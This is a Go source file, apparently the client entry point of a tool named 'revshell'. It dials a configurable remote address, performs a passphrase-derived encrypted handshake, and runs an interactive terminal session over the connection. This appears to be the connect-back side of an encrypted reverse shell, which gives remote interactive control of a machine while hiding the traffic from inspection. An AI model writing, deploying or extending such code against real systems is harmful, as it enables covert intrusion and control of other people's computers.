package main

import (
	"bufio"
	"errors"
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"strings"

	"revshell/pkg/secureio"
	"revshell/pkg/terminal"
)

func main() {
	available := strings.Join(secureio.ListCipherSuites(), ", ")
	addr := flag.String("addr", "127.0.0.1:2222", "remote server address")
	pass := flag.String("pass", "", "shared passphrase used to derive encryption keys")
	cipherName := flag.String("cipher", "aes", fmt.Sprintf("cipher suite to use (%s)", available))
	flag.Parse()

	if *pass == "" {
		fmt.Fprintln(os.Stderr, "client: passphrase must be provided via -pass")
		os.Exit(1)
	}

	conn, err := net.Dial("tcp", *addr)
	if err != nil {
		log.Fatalf("client: failed to connect to %s: %v", *addr, err)
	}
	defer conn.Close()

	reader, writer, err := secureio.Handshake(conn, false, *pass, *cipherName)
	if err != nil {
		log.Fatalf("client: handshake failed: %v", err)
	}

	log.Printf("client: connected to %s using %s cipher", *addr, *cipherName)

	bufferedReader := bufio.NewReader(reader)
	sessionOpts, err := terminal.ReceiveOptions(bufferedReader)
	if err != nil {
		log.Fatalf("client: failed to receive session options: %v", err)
	}

	session, err := terminal.NewSession(bufferedReader, writer, sessionOpts)
	if err != nil {
		log.Fatalf("client: failed to initialize session: %v", err)
	}

	if err := session.Run(); err != nil && !errors.Is(err, os.ErrClosed) {
		log.Printf("client: session ended with error: %v", err)
	}
}
